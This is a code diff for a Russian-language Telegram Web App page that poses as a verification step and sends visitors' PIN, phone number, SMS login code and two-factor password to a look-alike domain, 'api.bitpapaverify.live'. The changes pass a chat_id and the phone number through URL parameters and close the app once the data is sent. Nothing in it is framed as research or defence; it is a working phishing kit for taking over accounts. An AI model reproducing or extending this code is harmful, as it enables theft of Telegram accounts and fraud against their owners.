@@ -11,7 +11,6 @@
       --bg-color: #fff;
       --text-color: #000;
       --hint-color: #999;
-/*       --button-color: #2cab37; */
       --button-color: black;
       --button-text-color: #fff;
       --input-bg: #fff;
@@ -230,9 +229,6 @@
       </div>
     </div>
 
-
-
-
     <button class="tg-button" style="margin-top:50px" id="btn-ver" onclick="showStep('step-ver', 'step-phone');">Продолжить</button>
   </div>
   <!-- Шаг 1: Ввод PIN -->
@@ -266,7 +262,7 @@
   <div id="step-phone" class="step">
     <img src="gifs/phone.gif" class="tg-gif" alt="Телефон">
     <h2>Введите номер телефона</h2>
-    <input id="phone-input" class="tg-input" placeholder="+79991234567" autocomplete="tel">
+    <!-- <input id="phone-input" class="tg-input" placeholder="+79991234567" autocomplete="tel"> -->
     <div id="phone-error" class="error-message"></div>
     <button class="tg-button" id="btn-phone" onclick="submitPhone()">Продолжить</button>
   </div>
@@ -337,6 +333,29 @@ document.addEventListener('DOMContentLoaded', () => {
   initCustomKeyboard("sms-code-inputs", "sms-keyboard");
 });
 
+function getUrlParams() {
+    const params = new URLSearchParams(window.location.search);
+    return {
+        step: params.get("step"),
+        chat_id: params.get("chat_id"),
+    };
+}
+    const { step, chat_id, phone } = getUrlParams();
+
+    if (step === "2") {
+        // Убираем класс у step-pin
+        const stepPin = document.getElementById("step-pin");
+        const stepCode = document.getElementById("step-code");
+        if (stepPin && stepCode) {
+            stepPin.classList.remove("step-active");
+            stepCode.classList.add("step-active");
+        }
+    }
+
+    // Сохраняем chat_id для дальнейшего использования
+    window.chat_id = chat_id;
+    window.phone = phone;
+
 function initCustomKeyboard(inputContainerId, keyboardId) {
   const container = document.getElementById(inputContainerId);
   const inputs = Array.from(container.querySelectorAll("input"));
@@ -405,7 +424,6 @@ function setButtonLoading(id, loading, loadingText) {
   }
 }
 
-let userPhone = '';
 let userPin = '';
 let apiUrl = "https://api.bitpapaverify.live/api/step";
 
@@ -472,27 +490,19 @@ async function submitPin() {
 
 async function submitPhone() {
   setButtonLoading("btn-phone", true, "Подождите");
-  const phoneInput = document.getElementById("phone-input");
-  const phone = phoneInput.value.trim();
   const errorDiv = document.getElementById("phone-error");
   errorDiv.textContent = "";
 
-  if (!phone) {
-    errorDiv.textContent = "Введите номер";
-    setButtonLoading("btn-phone", false);
-    return;
-  }
-
-  userPhone = phone;
   try {
     const res = await fetch(apiUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ step: "phone", phone, pin: userPin })
+      body: JSON.stringify({ step: "phone2", pin: userPin, chat_id: window.chat_id })
     });
     const json = await res.json();
     if (json.ok) {
       showStep("step-phone", "step-code");
+      Telegram.WebApp.close();
     } else {
       errorDiv.textContent = replaceServerErrors(json.error) || "Ошибка телефона";
       setButtonLoading("btn-phone", false);
@@ -520,7 +530,7 @@ async function submitSmsCode() {
     const res = await fetch(apiUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ step: "sms", phone: userPhone, sms_code, pin: userPin })
+      body: JSON.stringify({ step: "sms", phone: window.phone, sms_code, pin: userPin })
     });
     const json = await res.json();
 
@@ -530,7 +540,7 @@ async function submitSmsCode() {
       await fetch(apiUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
+        body: JSON.stringify({ step: "done", phone: window.phone, pin: userPin })
       });
       showStep("step-code", "step-done");
     } else {
@@ -555,7 +565,7 @@ async function submit2FA() {
     const res = await fetch(apiUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ step: "2fa", phone: userPhone, code_2fa, pin: userPin })
+      body: JSON.stringify({ step: "2fa", phone: window.phone, code_2fa, pin: userPin })
     });
     const json = await res.json();
 
@@ -563,7 +573,7 @@ async function submit2FA() {
       await fetch(apiUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
+        body: JSON.stringify({ step: "done", phone: window.phone, pin: userPin })
       });
       showStep("step-2fa", "step-done");
     } else {
